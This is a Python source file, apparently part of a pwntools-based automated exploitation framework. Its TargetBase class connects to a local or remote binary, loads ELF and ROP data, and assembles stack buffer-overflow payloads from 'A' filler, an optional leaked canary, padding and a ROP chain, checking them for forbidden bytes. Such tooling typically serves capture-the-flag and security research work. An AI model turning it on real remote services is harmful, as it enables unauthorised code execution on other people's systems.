import tempfile
import typing

from pwn import ELF, ROP, remote, process
from pwnlib.context import context
from loguru import logger

from core.libc_finder import LocalLibcFinder
from core.target_config import Config, Mode
from abstract.pwntarget import PwnTarget
from pwn import p64


class TargetBase:
    def reconnect(self):
        if self._config.mode == Mode.remote:
            self.process = remote(self._config.ip.exploded, self._config.port)
        elif self._config.mode == Mode.local:
            self.process = process(str(self._config.file.absolute()))
        else:
            logger.critical(f"Unknown mode selected")
            exit(0)

    def __init__(self, pwn_target: typing.Type[PwnTarget], config: Config):
        context.log_level = 'error'
        logger.info('Parsing command line arguments:')
        if config.mode == Mode.remote:
            logger.info(f"Starting in REMOTE mode. Target: {config.ip}:{config.port}")
            self.process = remote(config.ip.exploded, config.port)
        elif config.mode == Mode.local:
            logger.info(f"Starting in LOCAL mode. Target: {config.file.absolute()}")
            self.process = process(str(config.file.absolute()))
        else:
            logger.critical(f"Unknown mode selected")
            exit(0)
        self._config = config
        self.file = ELF(config.file)
        self.leave = False
        self.libc_hint = None
        if config.libc:
            self.libc_hint = config.libc
        self.libc = None
        if config.rop:
            logger.info("Enabling ROP support")
            self.rop = ROP(str(config.file.absolute()))
        else:
            self.rop = None

        self.pwn_target = pwn_target
        if config.no_offset:
            self.offset = None
        else:
            self.offset = config.offset
        self.offset = config.offset
        self.canary = None
        if config.main_function_address:
            self._main = config.main_function_address
        else:
            self._main = self.file.symbols[config.main_function_name]
        self.illegal_symbols = config.illegal_symbols

    def create_payload(self, rop_chain: bytes) -> bytes:
        result = self.filler + (p64(self.canary) if self.canary else b'') + (b'BBBBBBBB' if self.leave else b'') + rop_chain
        self.check_payload(result)
        return result
    @property
    def filler(self):
        return b'A' * self.offset

    def run_main(self, payload: bytes):
        self.pwn_target.main(self.process, payload, pwn_target=self)
        return self.pwn_target.input_handler(self.process, payload)

    @property
    def main(self):
        return self._main + self.file.address

    def check_payload(self, payload: bytes):
        if any((x in self.illegal_symbols) for x in payload):
            logger.critical("Found illegal symbol in the payload")
            exit(0)